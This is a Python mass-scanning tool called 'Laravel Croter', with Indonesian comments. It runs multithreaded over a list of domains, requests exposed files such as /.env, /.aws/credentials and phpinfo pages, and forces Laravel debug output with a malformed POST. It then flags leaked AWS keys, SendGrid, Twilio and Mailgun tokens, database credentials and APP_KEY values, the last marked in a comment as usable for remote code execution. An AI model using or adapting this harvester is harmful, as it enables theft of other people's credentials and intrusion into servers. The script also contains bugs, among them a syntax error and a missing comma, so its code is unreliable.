import requests
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore,Back,init
import datetime
import os
import random
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
init()


# CODED BY Justakazh





# SALAM BUAT (M)ANTA(N) :')
# lagi-lagi aku ngoding keinget sama kamu :') 
# NOTE: GW MALES REGEX, RESULT OTOMATIS KESAVE.

class AWS_SUCK:
	def __init__(self):
		# BIKIN DIRECTORY
		self.red  = '\033[91m'
		self.blue  = '\033[94m'
		self.green = '\033[92m'
		self.white = '\033[00m'
		self.cyan    = '\033[0;96m'
		self.kolor_lo = [self.red, self.blue, self.green, self.white, self.cyan]
		self.date = datetime.datetime.now().date()
		try:
			pwd = os.getcwd()
			self.Outputs = os.path.join(pwd, "output/"+str(self.date)+"/")
			os.makedirs(self.Outputs)
		except:
			pass
		# TAMBAHIN SENDIRI 
		self.path = [
			"/.env",
			"/.env.bak",
			"/.aws/credentials"
			"/phpinfo",
			"/phpinfo.php",
			"/aws.yml", 
			"/info.php", 
			"/config/aws.yml",
                        "/.json", 
                        "/.config", 
                        "/config.yaml", 
                        "/config.json", 
                       "/index.php", 
		]




	# banner biar kek heker pro
	def banner(self):
		print("""{}



   __   ___  ________  ____  ______
  / /  / _ |/ ___/ _ \/ __ \/_  __/
 / /__/ __ / /__/ , _/ /_/ / / /   
/____/_/ |_\___/_/|_|\____/ /_/    
        {}                               
        {}                               
    Start date: {}

			""".format(random.choice(self.kolor_lo), "Laravel Croter",  "Coded By Justakazh", self.date))


	# CHECK DULU TOD
	def check(self, content, url):
		try:
			isi = content.text

			# TAMBAHIN KATA YANG KALIAN CARI

			# TWILLIO
			if "TWILIO_ACCOUNT_SID" in isi or "TWILLIO_SID" in isi or "TWILLIO_ACCOUNT_SID" in isi or "TWILIO_SID" in isi or '"twilio"' in isi or "ACCOUNT_SID" in isi:
				print ("{}[!] FOUND TWILIO {}".format(self.green, url))
				self.save("TWILIO.txt", url)
	        
			# AWS
			if "AKIA" in isi '"AKIA"' in isi:
				print ("{}[!] FOUND AWS {}".format(self.green, url))
				self.save("AWS.txt", url)

			# NEXMO
			if "NEXMO" in isi or '"NEXMO"' in isi or '"nexmo"' in isi:
				print ("{}[!] FOUND NEXMO {}".format(self.green, url))
				self.save("NEXMO.txt", url)

			# IONOS
			if "ionos" in isi:
				print ("{}[!] FOUND IONOS {}".format(self.green, url))
				self.save("IONOS.txt", url)

			# PHPINFO
			if "phpinfo()" in isi:
				print ("{}[!] FOUND PHPINFO {}".format(self.green, url))
				self.save("VARIABLE.txt", url)
	        
			# SMTP RANDOM
			if "MAIL_PASSWORD" in isi:
				print ("{}[!] FOUND MAIL OTHER {}".format(self.green, url))
				self.save("MAIL-OTHER.txt", url)

			# SENDGRID
			if "SG." in isi or "sendgrid" in isi:
				print ("{}[!] FOUND SENDGRID {}".format(self.green, url))
				self.save("SENDGRID.txt", url)

			# COINPAYMENTS
			if "COINPAYMENTS" in isi or "coinpayments" in isi:
				print ("{}[!] FOUND COINPAYMENTS {}".format(self.green, url))
				self.save("COINPAYMENTS.txt", url)

			# OFFICE365
			if '"office365"' in isi or "office365" in isi:
				print ("{}[!] FOUND OFFICE365 {}".format(self.green, url))
				self.save("OFFICE365.txt", url)

			# MANDRILL
			if "mandrillapp" in isi:
				print ("{}[!] FOUND MANDRILL {}".format(self.green, url))
				self.save("MANDRILL.txt", url)

			# PLIVO
			if "PLIVO" in isi or "plivo" in isi or '"PLIVO"' in isi or '"plivo"' in isi:
				print ("{}[!] FOUND PLIVO {}".format(self.green, url))
				self.save("PLIVO.txt", url)

			# APP_KEY -> BUAT RCE ANJG
			if "APP_KEY" in isi:
				print ("{}[!] FOUND APP_KEY {}".format(self.green, url))
				self.save("APP_KEY.txt", url)

			# MAILGUN
			if "mailgun" in isi:
				print ("{}[!] FOUND MAILGUN {}".format(self.green, url))
				self.save("MAILGUN.txt", url)

			# DATABASE CREDENTIAL
			if "DB_USERNAME" in isi:
				print ("{}[!] FOUND DATABASE{}".format(self.green, url))
				self.save("DATABASE.txt", url)

			# BAD LUCKY :(
			else:
				print ("{}[-] NOTHING {}".format(self.red, url))

		except:
			pass

    # SIMPEN TAPI BUKAN JADI SIMPENAN
	def save(self, title, url):
		try:
			open(self.Outputs+"/"+title, "a").write(url+"\n")
		except:
			pass

	# Check Domain Aktif ga tu 
	def iyabukan(self, domain):
		try:

			r = requests.get(domain, headers={"user-agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0; Mandajanganpergi) Gecko/20190101 Firefox/77.0"}, timeout=20, allow_redirects=False)
			
			# kalo aktif gassin lah, yakali dighosting
			if r.status_code == 200:
				self.akurapopo(domain)
			elif r.status_code == 302:
				self.akurapopo(domain)
			elif r.status_code == 301:
				self.akurapopo(domain)
			else:
				print ("{}[!] Can't Access {}".format(self.red, domain))

		except:
			print ("{}[!] Can't Access {}".format(self.red, domain))

	# REQUEST
	def akurapopo(self, domain):
		try:
			for a in self.path:
				url = domain+a
				r = requests.get(url, headers={"user-agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0; Mandajanganpergi) Gecko/20190101 Firefox/77.0"})
				self.check(r, url)
			rr = requests.get(url, headers={"user-agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0; Mandajanganpergi) Gecko/20190101 Firefox/77.0"}, data="halomin[]=asu")
			self.check(rr, url+" [DEBUG POST]")
		except:
			pass


matur_sembah_nuwun_sanget_sampun_nate_nglarani = AWS_SUCK()
matur_sembah_nuwun_sanget_sampun_nate_nglarani.banner()
tresno = [i.strip() for i in open(str(input("List : "))).readlines()]
lali = Pool(int(input('Thread : ')))
lali.map(matur_sembah_nuwun_sanget_sampun_nate_nglarani.iyabukan, tresno)



# REFERENCE
# - Suhada 
# - adam
# - abdan
# - pino
